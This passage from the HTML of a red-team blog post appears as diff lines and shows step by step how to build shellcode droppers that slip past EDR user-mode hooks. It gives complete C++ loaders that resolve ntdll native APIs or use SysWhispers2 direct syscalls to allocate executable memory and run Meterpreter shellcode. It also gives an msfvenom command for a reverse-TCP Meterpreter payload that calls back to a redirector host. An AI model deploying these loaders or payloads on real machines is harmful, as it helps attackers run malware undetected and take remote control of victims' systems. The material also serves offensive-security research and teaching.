+    ULONG_PTR ZeroBits<span class="token punctuation">,</span>
+    PSIZE_T RegionSize<span class="token punctuation">,</span>
+    ULONG AllocationType<span class="token punctuation">,</span>
+    ULONG Protect
+    <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>If you look at the code of the medium level dropper, you will see that the import of the actual function of the native APIs used is still done via the <code class="inline-code">ntdll.dll</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token comment">// Load the NtAllocateVirtualMemory function from ntdll.dll</span>
+    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory <span class="token operator">=</span>
+        <span class="token punctuation">(</span>PNTALLOCATEVIRTUALMEMORY<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtAllocateVirtualMemory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>For example, if an EDR would only sets its user mode hooks in kernel32.dll, the medium level API dropper should be sufficient to bypass the EDR's hooks. The finished C++ code for the medium level dropper looks like this.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;winternl.h&gt;</span></span>
+
+<span class="token comment">// Define the NtAllocateVirtualMemory function pointer</span>
+<span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> PNTALLOCATEVIRTUALMEMORY<span class="token punctuation">)</span><span class="token punctuation">(</span>
+    HANDLE ProcessHandle<span class="token punctuation">,</span>
+    PVOID<span class="token operator">*</span> BaseAddress<span class="token punctuation">,</span>
+    ULONG_PTR ZeroBits<span class="token punctuation">,</span>
+    PSIZE_T RegionSize<span class="token punctuation">,</span>
+    ULONG AllocationType<span class="token punctuation">,</span>
+    ULONG Protect
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Define the NtFreeVirtualMemory function pointer</span>
+<span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> PNTFREEVIRTUALMEMORY<span class="token punctuation">)</span><span class="token punctuation">(</span>
+    HANDLE ProcessHandle<span class="token punctuation">,</span>
+    PVOID<span class="token operator">*</span> BaseAddress<span class="token punctuation">,</span>
+    PSIZE_T RegionSize<span class="token punctuation">,</span>
+    ULONG FreeType
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+    <span class="token comment">// Insert Meterpreter shellcode </span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xa6\x12\xd9..."</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Load the NtAllocateVirtualMemory function from ntdll.dll</span>
+    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory <span class="token operator">=</span>
+        <span class="token punctuation">(</span>PNTALLOCATEVIRTUALMEMORY<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtAllocateVirtualMemory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Allocate Virtual Memory  </span>
+    <span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    SIZE_T size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    NTSTATUS status <span class="token operator">=</span> <span class="token function">NtAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exec<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span>PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Copy shellcode into allocated memory </span>
+    <span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Execute shellcode in memory  </span>
+    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Free the allocated memory using NtFreeVirtualMemory</span>
+    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory <span class="token operator">=</span>
+        <span class="token punctuation">(</span>PNTFREEVIRTUALMEMORY<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtFreeVirtualMemory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    SIZE_T regionSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    status <span class="token operator">=</span> <span class="token function">NtFreeVirtualMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exec<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regionSize<span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>API-Monitor:&nbsp;Medium Level APIs</h4>
+<p></p>
+<p>In this case, API Monitor should also be used to check which APIs are used by the medium level dropper. In this case, API Monitor will filter for the following API calls:</p>
+<ul><li>VirtualAlloc</li><li>NtAllocateVirtualMemory<br></li><li>RtlCopyMemory<br></li><li>CreateThread</li><li>NtCreateThreadEx<br></li><li>NtFreeVirtualMemory</li></ul>
+<p></p>
+<p>The following figure shows that the medium level dropper correctly no longer imports or uses Windows APIs. In other words, Windows APIs are no longer obtained via <code class="inline-code">kernel32.dll</code>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/api-monitor_medium_level_poc.png" alt="Api monitor medium level poc" width="1000" height="273">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Dumpbin: Medium Level APIs</h4>
+<p>In this case, I would also like to check the imported Windows APIs with dumpbin. Since in this case the medium level POC is only getting native APIs from <code class="inline-code">ntdll.dll</code>, the figure shows that in the context of the APIs we are using, no Windows APIs are being imported from <code class="inline-code">kernel32.dll</code>. This result is expected and plausible. </p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/dumpbin_medium_level.png" alt="Dumpbin medium level" width="670" height="474">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>x64dbg: Medium Level APIs</h4>
+<p>Since no direct system calls are used in the medium level POC, you can see with x64dbg that the system call for <code class="inline-code">NtAllocateVirtualMemory</code> correctly comes from the .text region of <code class="inline-code">ntdll.dll</code>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/systemcall_x64dbg_medium_level.png" alt="Systemcall x64dbg medium level" width="940" height="170">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/medium_level_poc_illustration.png" alt="Medium level poc illustration" width="1572" height="658">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Step 3: Low Level APIs</h3>
+<p>The third step is the further development of the medium level dropper into a low level dropper, i.e. I am now creating the actual direct system call dropper. <strong>Thanks</strong> to my buddy<strong> Jonas</strong> for helping me finish the low level dropper.<br><br>As mentioned before, system calls are usually made using the native APIs in ntdll.dll. This means that in order to be able to use the functions of the native APIs used and the associated syscalls without accessing the ntdll.dll, they have to be implemented directly in the code of the low level dropper. In this case, the required code is implemented in the .text region of the low level dropper.<br><br>Fortunately, there are ingenious tools called <strong>SysWhispers2 </strong>by <strong>@Jackson_T</strong> that can automatically generate the required code.</p>
+<ul><li>syscalls.h<br></li><li>syscalls.c&nbsp;<br></li><li>syscallsstubs.std.x64.asm</li></ul>
+<p></p>
+<p>The following command can be used to create the necessary files with <strong>SysWhispers2</strong>. In this case, I want to avoid unneeded code ending up in the low level API dropper, so I specify exactly the Native APIs I need with the -f parameter. In this case, the following native APIs and corresponding system calls are required in the form of assembly code: <br></p>
+<ul><li>NtAllocateVirtualMemory</li><li>NtWriteVirtualMemory</li><li>NtCreateThreadEx</li><li>NtWaitForSingleObject</li><li>NtClose</li></ul>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-python" tabindex="0"><code class="code-block-inner language-python">python syswhispers<span class="token punctuation">.</span>py <span class="token operator">-</span>f NtAllocateVirtualMemory<span class="token punctuation">,</span>NtWriteVirtualMemory<span class="token punctuation">,</span>NtCreateThreadEx<span class="token punctuation">,</span>NtWaitForSingleObject<span class="token punctuation">,</span>NtClose <span class="token operator">-</span>a x64 <span class="token operator">-</span>l masm <span class="token operator">-</span><span class="token operator">-</span>out<span class="token operator">-</span><span class="token builtin">file</span> syscalls</code></pre>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/syswhispers2_output.png" alt="Syswhispers2 output" width="575" height="297">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The <code class="inline-code">syscalls.h</code> file can then be added to the VS project as a header, the <code class="inline-code">syscallsstubs.std.x64.asm</code> (for x64) file as a resource and the <code class="inline-code">syscalls.c</code> file as a source. To use the assembly code from the .asm file in VS, the Microsoft Macro Assembler (.masm) option must be enabled in Build Dependencies/Build Customisations. See the SysWhispers2 <a href="https://github.com/jthuraisamy/SysWhispers2#:~:text=Importing%20into%20Visual%20Studio" target="_blank" rel="noreferrer noopener"><strong>documentation</strong></a> for more details. </p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/masm.png" alt="Masm" width="578" height="342">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>In addition, the properties of the file <code class="inline-code">syscallsstubs.std.x64.asm</code> must be specified as follows.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/low_level_properties_asm_code.png" alt="Low level properties asm code" width="778" height="171">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/low_level_vs.png" alt="Low level vs" width="1240" height="611">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>In this case, the dropper also needs the code of the native APIs used and the corresponding system calls, but the big difference compared to the medium level dropper is that the code is no longer done via <code class="inline-code">ntdll.dll</code> (hooked by the EDR), but is integrated directly into the dropper. If you compare the final code of the low level dropper with the code of the medium level dropper, you will notice that the function pointers to the native APIs used are no longer in main, but in the header file <code class="inline-code">syscalls.h</code>. The code required for the functions and system calls is in the file <code class="inline-code">syscallsstubs.std.x64.asm</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"syscalls.h"</span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// Insert Meterpreter shellcode</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xa6\x12\xd9..."</span><span class="token punctuation">;</span>
+
+
+    LPVOID allocation_start<span class="token punctuation">;</span>
+    SIZE_T allocation_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    HANDLE hThread<span class="token punctuation">;</span>
+    NTSTATUS status<span class="token punctuation">;</span>
+
+    allocation_start <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Allocate Virtual Memory </span>
+    <span class="token function">NtAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>allocation_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>PULONG64<span class="token punctuation">)</span><span class="token operator">&amp;</span>allocation_size<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Copy shellcode into allocated memory</span>
+    <span class="token function">NtWriteVirtualMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allocation_start<span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Execute shellcode in memory </span>
+    <span class="token function">NtCreateThreadEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hThread<span class="token punctuation">,</span> GENERIC_EXECUTE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allocation_start<span class="token punctuation">,</span> allocation_start<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token comment">// Wait for the end of the thread and close the handle</span>
+    <span class="token function">NtWaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">NtClose</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>If everything has been done correctly, the direct system call dropper is ready and can be compiled.</p>
+<h4><br></h4>
+<h4>API-Monitor:&nbsp;Low Level APIs</h4>
+<p>Even after the last change, I want to use API Monitor to check which APIs are used by the low-level dropper. In this case, API Monitor will filter for the following API calls:</p>
+<ul><li>VirtualAlloc</li><li>NtAllocateVirtualMemory<br></li><li>RtlCopyMemory<br></li><li>CreateThread</li><li>NtCreateThreadEx<br></li><li>NtFreeVirtualMemory</li></ul>
+<p></p>
+<p>In the following picture you can see that the import of the Native APIs is also done via the <code class="inline-code">ntdll.dll</code>. This result is not entirely clear to me at the moment, because with the low level dropper I do not get the native APIs via the <code class="inline-code">ntdll.dll</code>, but have implemented them directly in the .text region of the dropper, one should not actually see any imported native APIs. The result with API Monitor does not seem plausible to me in this case.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/low_level_api_monitor.png" alt="Low level api monitor" width="865" height="361">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Dumpbin:&nbsp;Low Level APIs&nbsp;</h4>
+<p>Using dumpbin, I check again which Windows APIs are being imported via <code class="inline-code">kernel32.dll</code>. Again, no Windows APIs are imported from the native APIs in the context. The result is OK so far.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/dumpbin_low_level.png" alt="Dumpbin low level" width="619" height="478">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>x64dbg:&nbsp;Low Level APIs</h4>
+<p>As already known, I did not call the native APIs and the corresponding system calls in the low level dropper via <code class="inline-code">ntdll.dll</code>, but implemented them directly in the dropper. This can be checked with x64dbg by looking at the implemented functions in low_level.exe. The following figure shows that the native API <code class="inline-code">NtAllocateVirtualMemory</code> has been implemented correctly.<br><br>The figure also shows that the <code class="inline-code">syscall</code> instruction to <code class="inline-code">NtAllocateVirtualMemory</code> is correctly implemented in the low level dropper. To do this, I follow the native API <code class="inline-code">NtAllocateVirtualMemory</code> in the dissassembler (Follow in Dissassembler) and then use "Follow in Memory Map" to show where the <code class="inline-code">syscall</code> statement is called from. As expected, the call is made from the <strong>.text section</strong> of the <strong>PE structure</strong> of <strong>low_level.exe</strong>.</p>
+        </div>
+    </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/systemcall_x64dbg_low_level.png" alt="Systemcall x64dbg low level" width="1371" height="2047">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            
+<section class="blog-image-and-text-section bg-white onlyImage">
+    <div class="content blog-container onlyImage">
+        <figure class="image-container">
+                <img class="blog-image" src="https://redops.at/assets/images/blog/low_level_poc_illustration.png" alt="Low level poc illustration" width="1752" height="820">
+            <figcaption class="image-subtitle">
+                
+            </figcaption>
+        </figure>
+            </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Bonus section: Shellcode as .bin resource&nbsp;</h3>
+<p>As an additional task, I want to implement that the meterpreter shellcode in the direct system call dropper is not stored as an unsigned char, but as a resource in the form of a .bin file. This has the advantage that the dropper can also be equipped with stageless shellcode. The idea and code snippet for this is not mine, but, as so often, from an article by the <strong><a href="https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources" target="_blank" rel="noreferrer noopener">ired.team</a></strong>. I just integrated the code snippet into the syscall dropper.<br><br>First I create a stageless meterpreter payload with msfvenom as follows.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter_reverse_tcp LHOST<span class="token operator">=</span>IPv4_redirector LPORT<span class="token operator">=</span><span class="token number">80</span> <span class="token operator">-</span>f raw <span class="token operator">&gt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>code<span class="token punctuation">.</span>bin</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Afterwards, the shellcode can be imported into the VS project in .bin format as a resource.&nbsp;</p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/bin_as_ressource.png" alt=""></figure>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-cpp" tabindex="0"><code class="code-block-inner language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"syscalls.h"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"resource.h"</span></span>
+
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// Insert shellcode</span>
+    HRSRC codeResource <span class="token operator">=</span> <span class="token function">FindResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCE</span><span class="token punctuation">(</span>IDR_CODE_BIN1<span class="token punctuation">)</span><span class="token punctuation">,</span> L<span class="token string">"CODE_BIN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    DWORD codeSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> codeResource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    HGLOBAL codeResourceData <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> codeResource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    LPVOID codeData <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>codeResourceData<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    LPVOID allocation_start <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
+    SIZE_T allocation_size <span class="token operator">=</span> codeSize<span class="token punctuation">;</span>
+    HANDLE hThread <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Allocate Virtual Memory</span>
+    <span class="token function">NtAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>allocation_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>allocation_size<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Copy shellcode into allocated memory</span>
+    <span class="token function">NtWriteVirtualMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allocation_start<span class="token punctuation">,</span> codeData<span class="token punctuation">,</span> codeSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Execute shellcode in memory</span>
+    <span class="token function">NtCreateThreadEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hThread<span class="token punctuation">,</span> THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>allocation_start<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Wait for the end of the thread and close the handle</span>
+    <span class="token function">NtWaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">NtClose</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Summary</h3>
